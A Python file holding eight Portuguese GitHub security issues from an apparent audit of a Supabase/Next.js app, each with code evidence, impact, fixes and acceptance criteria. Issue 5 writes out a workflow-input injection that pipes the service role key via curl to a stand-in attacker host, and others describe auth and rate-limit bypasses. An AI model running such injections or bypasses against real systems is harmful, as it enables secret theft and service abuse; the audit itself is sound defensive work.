# -*- coding: utf-8 -*-
"""
Texto integral das issues do GitHub, em Markdown, pronto para copiar e colar.

Cada entrada é (numero, titulo_curto, corpo_markdown). O corpo já vem com o
título, as labels, a descrição, a evidência com arquivo:linha, o impacto, a
sugestão de correção e os critérios de aceite — nada é montado pelo
renderizador, que só desenha o bloco delimitado.

Achados triviais do mesmo tema foram agrupados (achados 8 e 9 numa issue só),
para não gerar spam de issues.
"""

ISSUES = [
    (
        1,
        "Fechar o cadastro público",
        """# [Segurança] Cadastro público aberto num produto de usuário único

**Labels:** `security`, `severidade: alta`, `auth`

## Problema

O modelo de acesso do produto é "usuário único" — afirmado no `CLAUDE.md`, no
comentário de `supabase/migrations/0007_conversas.sql` e na própria tela de
Configurações, que diz "Usuário único, e-mail e senha. Sem OAuth, sem papéis, sem
convite". Esse modelo não é imposto em nenhum ponto do servidor.

`/cadastro` está na lista de rotas públicas, o formulário chama `signUp()` sem
allowlist de e-mail, e o projeto exige que a confirmação de e-mail fique
DESLIGADA no painel do Supabase — o que faz `signUp()` devolver sessão pronta.
Resultado: um visitante anônimo obtém, preenchendo um formulário, uma sessão
`authenticated` válida que atravessa o middleware.

## Evidência

`src/lib/auth/rotas.ts:48-67`

```ts
const PUBLICAS = [
  '/login',
  '/cadastro',        // <- registro self-service, sem allowlist de e-mail
  '/esqueci-senha',
  '/redefinir-senha',
  '/auth',
  '/api/health',
  '/api/busca',
  '/api/vigilia/coletar',
  '/opengraph-image',
]
```

`src/components/auth/cadastro.tsx:62-83`

```ts
const { data, error } = await supabaseNavegador().auth.signUp({
  email: email.trim(),
  password: senha,
})
// ...
if (!data.session) { setAguardandoEmail(true); ... }
router.replace(destinoSeguro(proximo))   // sessão pronta, entra direto
```

`src/lib/auth/mensagens.ts:55` já traduz `signup_disabled`, o que mostra que a
possibilidade de fechar o cadastro foi cogitada — mas ela não virou exigência
documentada de deploy.

## Impacto

Com sessão `authenticated`, um estranho alcança:

- `POST /api/consulta/aovivo`, que gasta a API da OpenAI e consome o teto mensal
  **único** de 200 gerações, compartilhado com o dono;
- `GET /api/peca/[casoId]`, que gera o `.docx`;
- `UPDATE` em `public.vigilia_alteracoes`, cuja policy é `using (true)` (ver a
  issue do achado 6).

Os dados pessoais do dono **não** vazam: `clientes`, `conversas` e `perfil` têm
RLS por `auth.uid()`, conferida linha a linha nesta auditoria.

## Condição de explorabilidade

Vale enquanto "Allow new users to sign up" estiver ligado no painel do Supabase,
que é o padrão da plataforma.

## Sugestão de correção

1. Desligar **Authentication → Sign In / Providers → Allow new users to sign up**
   no painel do Supabase.
2. Registrar essa exigência ao lado da de "Confirm email desligado", em
   `CLAUDE.md` e `README.md`. Configuração de painel que não está escrita não
   sobrevive ao próximo deploy.
3. Opcionalmente, remover `/cadastro` de `PUBLICAS` e da navegação, deixando a
   criação da conta única para o painel do Supabase.
4. Se o cadastro precisar continuar existindo, ancorar o teto de LLM por
   `auth.uid()` para que uma conta nova não gaste a cota de outra.

## Critérios de aceite

- [ ] "Allow new users to sign up" está desligado no projeto Supabase de produção.
- [ ] A exigência está escrita em `CLAUDE.md` e `README.md`, junto das outras
      configurações obrigatórias de painel.
- [ ] Um `POST` para `/auth/v1/signup` com a chave publishable devolve erro
      (`signup_disabled`), verificado manualmente.
- [ ] A tela de cadastro exibe a mensagem em português já existente para
      `signup_disabled`, em vez de erro cru.
- [ ] Um teste e2e cobre o caminho "cadastro recusado" (ou o teste de cadastro é
      removido com a justificativa registrada).
""",
    ),
    (
        2,
        "Revogar EXECUTE de anon em consome_uso_llm()",
        """# [Segurança] consome_uso_llm() é security definer e está concedida a anon — o teto mensal pode ser esgotado por qualquer um

**Labels:** `security`, `severidade: alta`, `banco`, `rls`

## Problema

`/api/consulta/aovivo` é protegida por sessão e só chama a função depois de passar
pelo middleware. Mas esse gate vive **apenas na aplicação**: no banco, a função é
`security definer` — portanto ignora a RLS que fecha `uso_llm` — e tem `EXECUTE`
concedido a `anon`.

A chave publishable necessária para invocá-la é pública por construção e foi
encontrada em texto claro no bundle compilado
(`.next/static/chunks/app/(app)/consulta/page.js`). Um `POST` direto a
`https://<projeto>.supabase.co/rest/v1/rpc/consome_uso_llm` com essa chave
incrementa o contador: sem cookie, sem passar pela rota, e sem tocar no limite por
IP que vive na memória do processo Node.

## Evidência

`supabase/migrations/0010_teto_llm.sql:21-27`

```sql
create or replace function public.consome_uso_llm()
returns table (permitido boolean, chamadas integer, teto integer)
language plpgsql
security definer                       -- ignora a RLS que fecha uso_llm
set search_path = public, pg_temp
as $$ ... update public.uso_llm u set chamadas = u.chamadas + 1 ... $$;
```

`supabase/migrations/0010_teto_llm.sql:57-58`

```sql
revoke all on public.uso_llm from anon, authenticated;
grant execute on function public.consome_uso_llm() to anon, authenticated;
--                                                    ^^^^
```

`src/app/api/consulta/aovivo/route.ts:149`

```ts
const { data, error } = await supabase.rpc('consome_uso_llm')
```

## Impacto

Duzentas requisições anônimas zeram o teto do mês. A partir daí
`/api/consulta/aovivo` devolve `429` para o próprio dono e a Consulta cai
permanentemente para a resposta composta até o mês virar. É negação de serviço
sobre a funcionalidade central do produto, ao custo de 200 requisições HTTP e
nenhuma credencial.

## Condição de explorabilidade

Nenhuma. Basta ler a chave publishable do bundle público, que é o modo normal de
operação do Supabase no navegador.

## Sugestão de correção

Nova migration aditiva:

```sql
revoke execute on function public.consome_uso_llm() from anon;
-- e, se a rota passar a usar a service role, também de authenticated
```

Melhor ainda: mover o consumo do teto para um caminho que exija a service role,
já que a rota que a chama roda no servidor — o mesmo desenho de
`src/lib/vigilia/escrita.ts`, que existe exatamente por essa razão.

Se o teto continuar sendo pedido pela chave publishable, ancorá-lo em
`auth.uid()` para que a cota seja por conta, não global.

## Critérios de aceite

- [ ] Uma migration numerada revoga `EXECUTE` de `anon` sobre
      `public.consome_uso_llm()`.
- [ ] `select has_function_privilege('anon', 'public.consome_uso_llm()', 'execute')`
      devolve `false` no banco de produção.
- [ ] Uma chamada `rpc('consome_uso_llm')` com a chave publishable **sem sessão**
      devolve `42501`, verificada manualmente.
- [ ] `/api/consulta/aovivo` continua funcionando com sessão válida (um teste e2e
      ou uma verificação manual registrada no PR).
- [ ] O cabeçalho de `0010_teto_llm.sql` — que hoje argumenta que a tabela fica
      fechada — é atualizado para descrever quem pode pedir a vaga.
""",
    ),
    (
        3,
        "Pôr freio em /api/busca",
        """# [Segurança] /api/busca é pública, sem limite algum, e gasta a API da OpenAI a cada requisição

**Labels:** `security`, `severidade: média`, `custo`, `api`

## Problema

A rota está deliberadamente em `PUBLICAS`, e o motivo escrito no código é
legítimo: ela lê o mesmo corpus que a chave publishable já expõe sob RLS
somente-leitura. O que não acompanhou a decisão foi um freio.

`/api/consulta/aovivo` tem três (sessão, limite por IP e teto no banco).
`/api/busca` não tem nenhum: nem rate limit, nem cache de embedding, nem cota.
Cada `GET` dispara uma chamada paga à OpenAI com `cache: 'no-store'`, e a consulta
é aceita até 400 caracteres, o que multiplica o custo por token.

## Evidência

`src/lib/auth/rotas.ts:55`

```ts
const PUBLICAS = [
  ...
  '/api/busca',
  ...
]
```

`src/app/api/busca/route.ts:71-83`

```ts
export async function GET(req: Request) {
  const p = new URL(req.url).searchParams
  return responde(p.get('q'), p.get('lei'), p.get('qtd'))   // sem sessão, sem limite
}
```

`src/lib/busca/consultar.ts:68-74`

```ts
const r = await fetch('https://api.openai.com/v1/embeddings', {
  method: 'POST',
  headers: { 'content-type': 'application/json', authorization: `Bearer ${chave}` },
  body: JSON.stringify({ model: MODELO_EMBEDDING, input: consulta }),
  signal: AbortSignal.timeout(8000),
  cache: 'no-store',
})
```

## Impacto

Custo financeiro sem limite superior, provocável por um atacante anônimo, e
esgotamento da cota da conta OpenAI — que é a mesma que alimenta
`/api/consulta/aovivo` e o `npm run embed`. Secundariamente, cada requisição
consome uma execução de função serverless e uma RPC do plano gratuito do Supabase.

## Condição de explorabilidade

Nenhuma, além de o deploy ter `OPENAI_API_KEY` configurada. Sem a chave a rota
degrada para busca sem a perna semântica e o custo desaparece.

## Sugestão de correção

Escolher uma das três, em ordem de preferência:

1. **Exigir sessão** — tirar `/api/busca` de `PUBLICAS`. O argumento do 307 para
   `/login` continua válido, mas pode ser resolvido devolvendo `401` JSON quando o
   `Accept` for `application/json`.
2. **Rate limit + cota**, no mesmo desenho do teto de LLM: uma função no banco que
   decide e escreve na mesma instrução, para valer sob concorrência.
3. **Cache de embedding** por consulta normalizada (hash do texto), que resolve o
   custo do caso repetido sem mexer no acesso.

## Critérios de aceite

- [ ] Uma requisição anônima em rajada a `/api/busca` passa a receber `429` (ou
      `401`) depois de um limite documentado.
- [ ] O limite é imposto num ponto compartilhado entre instâncias serverless — não
      só num `Map` na memória do processo.
- [ ] O caminho de degradação continua o mesmo: sem `OPENAI_API_KEY`, a busca
      responde sem a perna semântica em vez de falhar.
- [ ] O cabeçalho de `src/app/api/busca/route.ts` é atualizado para descrever o
      freio, já que hoje ele argumenta explicitamente a ausência dele.
- [ ] Um teste cobre o comportamento no limite.
""",
    ),
    (
        4,
        "Autorização própria nos route handlers",
        """# [Segurança] Rotas de API não verificam sessão no handler, e o matcher do middleware exclui caminhos por extensão

**Labels:** `security`, `severidade: média`, `auth`, `api`

## Problema

A autorização das rotas de API vive inteiramente no middleware — os handlers não
chamam `usuarioAtual()`. As páginas têm uma segunda camada em
`src/app/(app)/layout.tsx`, que repete o `redirect`; as rotas de API não têm
nenhuma.

E o `matcher` do middleware pula qualquer caminho terminado em `.txt`, `.xml`,
`.svg`, `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.ico`. Numa rota com segmento
dinâmico, quem controla o segmento controla se o porteiro roda.

Verificado executando o regex do próprio arquivo contra caminhos reais:

```
/api/peca/caso_flagrante     MIDDLEWARE RODA
/api/peca/caso.txt           MIDDLEWARE PULADO
/api/consulta/aovivo         MIDDLEWARE RODA
/artigo/abc.xml              MIDDLEWARE PULADO
```

## Evidência

`src/middleware.ts:115-121`

```ts
export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon\\\\.ico|.*\\\\.(?:svg|png|jpg|jpeg|gif|webp|ico|txt|xml)$).*)',
  ],
}
```

`src/app/api/peca/[casoId]/route.ts:26-38` — nenhuma checagem de usuário

```ts
export async function GET(
  _req: Request,
  { params }: { params: Promise<{ casoId: string }> },
) {
  const { casoId } = await params
  const [c, ts] = await Promise.all([leCaso(casoId), tesesComTemplate()])
  ...
}
```

`src/app/(app)/layout.tsx:22-24` — a rede de segurança que só as páginas têm

```ts
const usuario = await usuarioAtual()
if (!usuario) redirect(ROTA_LOGIN)
```

## Impacto

Hoje o impacto é contido, e é justo dizê-lo: os seis ids de caso em
`data/curadoria/casos.yaml` não terminam em extensão excluída, então
`/api/peca/x.txt` resolve para `404` e não entrega peça nenhuma; e `public.casos`
tem policy de leitura pública, portanto o conteúdo não é privado.

O risco é **estrutural**: a próxima rota de API com segmento dinâmico — ou o
próximo id de caso com ponto no nome — nasce sem porteiro, e nada no repositório
avisaria. É exatamente a classe de erro que a decisão "rota nova nasce fechada"
existe para impedir.

## Sugestão de correção

1. Chamar `usuarioAtual()` no início de cada route handler que não seja
   intencionalmente público (`/api/peca/[casoId]` e `/api/consulta/aovivo`),
   devolvendo `401` quando não houver usuário. É o análogo, para as rotas, do que
   `(app)/layout.tsx` já faz para as páginas.
2. Ajustar o `matcher` para que a exclusão por extensão não alcance `/api/` — por
   exemplo, negando a exclusão quando o caminho começa por `api/`.
3. Anotar em `src/lib/auth/rotas.ts` que a lista `PUBLICAS` protege apenas o que o
   `matcher` alcança.

## Critérios de aceite

- [ ] `GET /api/peca/<id>` sem cookie de sessão devolve `401`, inclusive quando o
      `<id>` termina em `.txt`.
- [ ] `POST /api/consulta/aovivo` sem cookie devolve `401` a partir do próprio
      handler, e não só por redirect do middleware.
- [ ] O regex do `matcher` foi testado contra a mesma lista de caminhos deste
      relatório, e nenhum caminho sob `/api/` sai como "pulado".
- [ ] `/api/health`, `/api/busca` e `/api/vigilia/coletar` continuam alcançáveis
      pelos crons e pelo cliente, sem regressão.
- [ ] Um teste cobre o par "rota protegida sem sessão → 401".
""",
    ),
    (
        5,
        "Citar a interpolação no workflow da vigília",
        """# [Segurança] Injeção de comando no workflow da vigília, num job que carrega a service role

**Labels:** `security`, `severidade: média`, `ci`, `segredos`

## Problema

`${{ inputs.desde }}` é substituído textualmente no script de shell **antes** da
execução. Um valor como

```
2025-01-01; curl -d "$SUPABASE_SERVICE_ROLE_KEY" https://atacante.example
```

vira um comando a mais dentro do mesmo passo, com todas as variáveis de ambiente
do job à disposição.

A rota HTTP equivalente do projeto, `/api/vigilia/coletar`, valida o formato com
`/^\\d{4}-\\d{2}-\\d{2}$/` (`src/app/api/vigilia/coletar/route.ts:69`) antes de
usar o parâmetro. O workflow não valida nada.

## Evidência

`.github/workflows/vigilia.yml:49-57`

```yaml
workflow_dispatch:
  inputs:
    desde:
      description: 'Data ISO (padrão: janela de 60 dias). Use a data de corte para carga completa.'
      required: false
```

`.github/workflows/vigilia.yml:93-111`

```yaml
- name: coletar
  env:
    PYTHONUNBUFFERED: '1'
    NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
    SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
    INLABS_EMAIL: ${{ secrets.INLABS_EMAIL }}
    INLABS_SENHA: ${{ secrets.INLABS_SENHA }}
  run: |
    python -m coletores \\
      ${{ inputs.seco && '--seco' || '' }} \\
      ${{ inputs.desde && format('--desde {0}', inputs.desde) || '' }}
```

## Impacto

Exfiltração de `SUPABASE_SERVICE_ROLE_KEY` — que ignora RLS e abre o banco inteiro
para escrita — e de `INLABS_EMAIL` / `INLABS_SENHA`.

O ganho real é **de privilégio**: segredos do GitHub Actions não são legíveis por
colaboradores, nem mesmo com permissão de escrita. Este passo os torna legíveis.

## Condição de explorabilidade

`workflow_dispatch` exige permissão de escrita no repositório. O atacante é,
portanto, um colaborador ou uma conta comprometida com `write`, não um anônimo.
Pull request vindo de fork não dispara `workflow_dispatch`.

## Sugestão de correção

Passar a entrada por `env:` e referenciá-la como variável de shell citada, que é a
forma que o próprio GitHub documenta:

```yaml
- name: coletar
  env:
    DESDE: ${{ inputs.desde }}
    SECO: ${{ inputs.seco }}
    SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
  run: |
    set -euo pipefail
    if [ -n "${DESDE:-}" ] && ! printf '%s' "$DESDE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
      echo "desde precisa ser AAAA-MM-DD" >&2; exit 1
    fi
    python -m coletores ${SECO:+--seco} ${DESDE:+--desde "$DESDE"}
```

Vale também restringir `permissions:` do job ao mínimo (`contents: read`).

## Critérios de aceite

- [ ] Nenhum `${{ inputs.* }}` aparece dentro de um bloco `run:` em
      `.github/workflows/`.
- [ ] O passo valida o formato ISO da data e falha com mensagem clara quando ele
      não bate — mesma regra da rota HTTP.
- [ ] Um `workflow_dispatch` com `desde = 2025-01-01; echo INJETADO` termina em
      erro de validação e **não** imprime `INJETADO` no log.
- [ ] Uma execução normal (sem `desde`, e com `desde` válido) continua passando.
- [ ] O job declara `permissions:` explícitas.
""",
    ),
    (
        6,
        "Restringir a policy marca_reconferido",
        """# [Segurança] A policy marca_reconferido usa using (true): qualquer sessão sobrescreve o carimbo de qualquer linha

**Labels:** `security`, `severidade: baixa`, `banco`, `rls`

## Problema

`using (true)` diz que a policy alcança **todas** as linhas da tabela. O
`with check` só obriga a assinar com o próprio `uid` — não impede sobrescrever a
marca de outro.

Numa tabela de um usuário só isso é inofensivo por definição. Combinado com o
cadastro aberto (issue do achado 1), qualquer estranho que crie conta passa a
poder marcar como "conferido" achados da vigília que o dono ainda não leu, ou
re-carimbar os que ele já leu.

## Evidência

`supabase/migrations/0012_vigilia.sql:138-145`

```sql
grant update (reconferido_em, reconferido_por)
  on public.vigilia_alteracoes to authenticated;

drop policy if exists marca_reconferido on public.vigilia_alteracoes;
create policy marca_reconferido on public.vigilia_alteracoes
  for update to authenticated
  using (true)                                  -- <- alcança toda linha
  with check (reconferido_por = (select auth.uid()));
```

`src/lib/vigilia/marcar.ts:28-31`

```ts
const { error } = await sb
  .from('vigilia_alteracoes')
  .update({ reconferido_em: new Date().toISOString(), reconferido_por: dono.user.id })
  .eq('id', id)
```

## Impacto

Corrupção do estado de trabalho da vigília: um achado marcado como conferido deixa
de pedir atenção na tela `/fontes`. Como a vigília existe para avisar que a data
de corte envelheceu, silenciar um achado tem consequência jurídica indireta.

O `grant` **por coluna** limita bem o dano — `ementa`, `url` e `leis_tocadas`
continuam inalteráveis, e isso é acerto de projeto que deve ser preservado.

## Sugestão de correção

Nova migration aditiva:

```sql
drop policy if exists marca_reconferido on public.vigilia_alteracoes;
create policy marca_reconferido on public.vigilia_alteracoes
  for update to authenticated
  using (reconferido_por is null or reconferido_por = (select auth.uid()))
  with check (reconferido_por = (select auth.uid()));
```

Assim, marcar continua livre; **re**-marcar o que outra pessoa carimbou, não.

## Critérios de aceite

- [ ] Uma migration numerada substitui a policy.
- [ ] Com sessão A, marcar uma linha ainda não carimbada funciona.
- [ ] Com sessão B, atualizar uma linha já carimbada por A não afeta linha nenhuma
      (0 linhas atualizadas).
- [ ] `update public.vigilia_alteracoes set ementa = 'x'` continua devolvendo
      `42501` — o grant por coluna não foi afrouxado.
- [ ] O bloco de verificação pós-migration do arquivo é atualizado com os dois
      casos acima.
""",
    ),
    (
        7,
        "Exigir prova de identidade na troca de senha",
        """# [Segurança] Troca de senha não exige a senha atual, e a tela é alcançável com sessão comum

**Labels:** `security`, `severidade: baixa`, `auth`

## Problema

O cabeçalho de `src/components/auth/redefinir-senha.tsx` afirma que
`updateUser({ password })` só existe para quem tem sessão válida, e que é isso que
impede a URL da tela, sozinha, trocar a senha de alguém. A afirmação está certa e
é insuficiente: **a sessão de recuperação e a sessão comum de trabalho são a mesma
coisa para o Supabase**.

Como `/redefinir-senha` é pública e foi deliberadamente deixada fora de
`ROTAS_DE_FORMULARIO` (para não desviar quem chega pelo link de e-mail), um
usuário já logado abre a tela e troca a senha sem provar que conhece a antiga.

## Evidência

`src/lib/auth/rotas.ts:25` — a rota fica fora dos formulários de auth, então quem
tem sessão não é desviado dela:

```ts
export const ROTAS_DE_FORMULARIO = ['/login', '/cadastro', '/esqueci-senha'] as const
```

`src/lib/auth/rotas.ts:56` — e é pública:

```ts
  '/redefinir-senha',
```

`src/components/auth/redefinir-senha.tsx:53-62`

```ts
const supabase = supabaseNavegador()
const { error } = await supabase.auth.updateUser({ password: senha })
//                                    ^ nenhuma senha atual é pedida
...
await supabase.auth.signOut()
```

## Impacto

Um cookie de sessão obtido por outro caminho — aparelho compartilhado, sessão
esquecida aberta, um XSS futuro — vira tomada permanente da conta: o atacante
define senha nova e o dono perde o acesso. Sem exigir a senha atual, a janela
entre "emprestou a tela" e "perdeu a conta" é de dois campos de formulário.

## Condição de explorabilidade

Mitigável inteiramente fora do código: o Supabase tem a opção **Secure password
change**, que exige login recente para `updateUser({ password })`. Ela não é
mencionada em nenhum documento do repositório, e por isso o estado padrão é o
descrito acima.

## Sugestão de correção

1. Ligar **Authentication → Providers → Email → Secure password change** no painel
   do Supabase, e registrar a exigência ao lado das outras duas configurações
   obrigatórias de painel.
2. No cliente, marcar a sessão de recuperação (por exemplo, um sinal gravado por
   `/auth/confirmar` no retorno de `type=recovery`) e desviar de
   `/redefinir-senha` quem chega com sessão comum, mandando-o para
   `/esqueci-senha`.
3. Tratar o erro `reauthentication_needed` em `src/lib/auth/mensagens.ts`, para
   que a recusa apareça em português em vez de erro cru.

## Critérios de aceite

- [ ] "Secure password change" está ligado no projeto Supabase de produção, e a
      exigência está escrita em `CLAUDE.md` e `README.md`.
- [ ] Um usuário logado que abre `/redefinir-senha` sem fluxo de recuperação em
      curso é desviado, ou recebe pedido de reautenticação.
- [ ] O fluxo completo de recuperação por e-mail continua funcionando de ponta a
      ponta (teste manual registrado ou e2e).
- [ ] `src/lib/auth/mensagens.ts` traduz o erro de reautenticação.
- [ ] O comentário do cabeçalho de `redefinir-senha.tsx` é corrigido: ele hoje
      afirma uma garantia mais forte do que a que existe.
""",
    ),
    (
        8,
        "Endurecimento de borda: cabeçalhos e chave de rate limit",
        """# [Segurança] Endurecimento de borda: nenhum cabeçalho de segurança é emitido, e a chave do rate limit é forjável

**Labels:** `security`, `severidade: baixa`, `hardening`

Dois achados de endurecimento, agrupados por serem do mesmo tema — defesas de
borda que existem no desenho e não seguram na prática.

---

## Parte A — Nenhum cabeçalho de segurança é emitido

### Problema

Verificado por busca em `next.config.mjs`, `vercel.json` e `src/`: não existe
`Content-Security-Policy`, `X-Frame-Options`, `Referrer-Policy` nem
`X-Content-Type-Options`.

A ausência de CSP pesa mais aqui do que num app comum, porque existe um
`dangerouslySetInnerHTML` em produção. O saneamento em build é sólido — allowlist
de `sanitize-html`, `style` fora, `allowedSchemes` sem `javascript:` —, mas CSP é
justamente a camada que sobra quando o saneamento falha.

### Evidência

`next.config.mjs:1-21` — o arquivo inteiro; não há `async headers()`

```js
const nextConfig = {
  typescript: { ignoreBuildErrors: false },
  eslint: { ignoreDuringBuilds: false },
  outputFileTracingIncludes: {
    '/vademecum': ['./data/vademecum/**'],
    '/vademecum/[leiId]': ['./data/vademecum/**'],
  },
}
export default nextConfig
```

`vercel.json:1-13` — só `crons`, nenhum bloco `headers`.

O sink que a CSP cobriria: `src/app/(app)/vademecum/[leiId]/page.tsx:117`

```tsx
<article id={ID_TEXTO} className="lei-acervo mt-6"
  dangerouslySetInnerHTML={{ __html: html }} />
```

### Impacto

Defesa em profundidade ausente: qualquer falha futura de saneamento vira execução
de script sem obstáculo, e o produto pode ser emoldurado para clickjacking sobre
ações destrutivas — apagar cliente em `/clientes`, encerrar sessões em
`/configuracoes`.

---

## Parte B — A chave do rate limit vem de um cabeçalho que o cliente escreve

### Problema

`x-forwarded-for` é uma lista construída por proxies, e tomar o elemento mais à
**esquerda** é tomar o valor que o cliente pôde escrever. Basta variar o cabeçalho
a cada requisição para que cada uma caia numa chave diferente do `Map` e o
contador nunca chegue a cinco.

O código descreve honestamente o mecanismo como "quebra-molas, não portão" — o que
este achado registra é que o quebra-molas também não segura.

### Evidência

`src/app/api/consulta/aovivo/route.ts:138-145`

```ts
const ip =
  req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
  req.headers.get('x-real-ip') ||
  'desconhecido'

if (excedeu(ip)) {
  return NextResponse.json({ erro: 'muitas gerações seguidas — espere um minuto' }, { status: 429 })
}
```

### Impacto

Remove o único freio que sobra entre uma sessão válida e a chamada paga ao modelo,
deixando o teto mensal como defesa única — e o teto é justamente o que a issue do
achado 2 mostra ser esgotável de fora.

### Condição de explorabilidade

Depende do deploy. Atrás do proxy da Vercel o cabeçalho costuma ser reescrito pela
plataforma, o que anula a manobra; num deploy self-hosted, ou atrás de proxy que
apenas concatena, ela funciona. A lógica no código é insegura nos dois casos.

---

## Sugestão de correção

**Parte A** — declarar `async headers()` em `next.config.mjs`:

```js
async headers() {
  return [{
    source: '/:path*',
    headers: [
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'Content-Security-Policy', value:
        "default-src 'self'; frame-ancestors 'none'; base-uri 'self'; " +
        "object-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; " +
        "font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://*.supabase.co" },
    ],
  }]
}
```

A diretiva `script-src` merece uma passagem própria, com nonce, porque o App
Router injeta scripts inline — subir a CSP sem isso quebra a hidratação.

**Parte B** — usar o identificador do usuário da sessão como chave do limite (a
rota já exige sessão), ou ler o elemento correto de `x-forwarded-for` para o proxy
em uso, em vez do mais à esquerda.

## Critérios de aceite

- [ ] `curl -I` na home devolve `Content-Security-Policy`, `X-Frame-Options`,
      `Referrer-Policy` e `X-Content-Type-Options`.
- [ ] A CSP inclui `frame-ancestors 'none'`.
- [ ] Com a CSP ligada, as oito telas do produto carregam sem violação no console
      — em especial `/vademecum/[leiId]`, `/consulta` (SSE) e `/dosimetria`.
- [ ] A chave do rate limit de `/api/consulta/aovivo` não é mais o valor mais à
      esquerda de um cabeçalho enviado pelo cliente.
- [ ] Variar `x-forwarded-for` a cada requisição não permite passar do limite,
      verificado manualmente.
""",
    ),
]
